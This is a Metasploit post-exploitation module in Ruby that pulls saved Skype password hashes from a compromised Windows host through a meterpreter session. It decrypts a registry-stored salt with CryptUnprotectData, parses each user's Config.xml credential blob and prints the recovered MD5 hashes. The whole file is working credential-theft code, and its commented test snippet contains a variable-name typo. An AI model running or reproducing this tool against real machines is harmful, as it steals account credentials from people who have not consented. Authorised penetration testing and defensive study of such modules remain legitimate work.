##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Skype Saved Password Hash Extraction',
        'Description' => %q{
          This module finds saved login credentials
          for the Windows Skype client. The hash is in MD5 format
          that uses the username, a static string "\nskyper\n" and the
          password. The resulting MD5 is stored in the Config.xml file
          for the user after being XOR'd against a key generated by applying
          2 SHA1 hashes of "salt" data which is stored in ProtectedStorage
          using the Windows API CryptProtectData against the MD5
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'mubix', # module
          'hdm' # crypto help
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'References' => [
          ['URL', 'http://www.recon.cx/en/f/vskype-part2.pdf'],
          ['URL', 'https://web.archive.org/web/20140207115406/http://insecurety.net/?p=427'],
          ['URL', 'https://github.com/skypeopensource/tools']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_ls
              stdapi_railgun_api
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        }
      )
    )
  end

# To generate test hashes in ruby use:
=begin

require 'openssl'

username = "test"
passsword = "test"

hash = Digest::MD5.new
hash.update username
hash.update "\nskyper\n"
hash.update password

puts hash.hexdigest

=end

  def decrypt_reg(data)
    pid = session.sys.process.getpid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(512)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
      addr = Rex::Text.pack_int64le(mem)
      len = Rex::Text.pack_int64le(data.length)
      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
      pdata = ret['pDataOut'].unpack('VVVV')
      len = pdata[0] + (pdata[1] << 32)
      addr = pdata[2] + (pdata[3] << 32)
    end

    return '' if len == 0

    return process.memory.read(addr, len)
  end

  # Get the "Salt" unencrypted from the registry
  def get_salt
    print_status 'Checking for encrypted salt in the registry'
    vprint_status 'Checking: HKCU\\Software\\Skype\\ProtectedStorage - 0'
    rdata = registry_getvaldata('HKCU\\Software\\Skype\\ProtectedStorage', '0')
    print_good('Salt found and decrypted')
    return decrypt_reg(rdata)
  end

  # Pull out all the users in the AppData directory that have config files
  def get_config_users(appdatapath)
    users = []
    dirlist = session.fs.dir.entries(appdatapath)
    dirlist.shift(2)
    dirlist.each do |dir|
      if file?(appdatapath + "\\#{dir}" + '\\config.xml') == false
        vprint_error "Config.xml not found in #{appdatapath}\\#{dir}\\"
        next
      end
      print_good "Found Config.xml in #{appdatapath}\\#{dir}\\"
      users << dir
    end
    return users
  end

  def parse_config_file(config_path)
    hex = ''
    configfile = read_file(config_path)
    configfile.each_line do |line|
      if line =~ /Credentials/i
        hex = line.split('>')[1].split('<')[0]
      end
    end
    return hex
  end

  def decrypt_blob(credhex, salt)
    # Convert Config.xml hex to binary format
    blob = [credhex].pack('H*')

    # Concatinate SHA digests for AES key
    sha = Digest::SHA1.digest("\x00\x00\x00\x00" + salt) + Digest::SHA1.digest("\x00\x00\x00\x01" + salt)

    aes = OpenSSL::Cipher.new('AES-256-CBC')
    aes.encrypt
    aes.key = sha[0, 32] # Use only 32 bytes of key
    final = aes.update([0].pack('N*') * 4) # Encrypt 16 \x00 bytes
    final << aes.final
    xor_key = final[0, 16] # Get only the first 16 bytes of result

    vprint_status("XOR Key: #{xor_key.unpack('H*')[0]}")

    decrypted = []

    # Use AES/SHA crypto for XOR decoding
    16.times do |i|
      decrypted << (blob[i].unpack('C*')[0] ^ xor_key[i].unpack('C*')[0])
    end

    return decrypted.pack('C*').unpack('H*')[0]
  end

  def get_config_creds(salt)
    appdatapath = expand_path('%AppData%') + '\\Skype'
    print_status('Checking for config files in %APPDATA%')
    users = get_config_users(appdatapath)
    if users.any?
      users.each do |user|
        print_status("Parsing #{appdatapath}\\#{user}\\Config.xml")
        credhex = parse_config_file("#{appdatapath}\\#{user}\\config.xml")
        if credhex == ''
          print_error("No Credentials3 blob found for #{user} in Config.xml skipping")
          next
        else
          hash = decrypt_blob(credhex, salt)
          print_good "Skype MD5 found: #{user}:#{hash}"
        end
      end
    else
      print_error 'No users with configs found. Exiting'
    end
  end

  def run
    salt = get_salt
    if !salt.nil?
      get_config_creds(salt)
    else
      print_error 'No salt found. Cannot continue without salt, exiting'
    end
  end
end
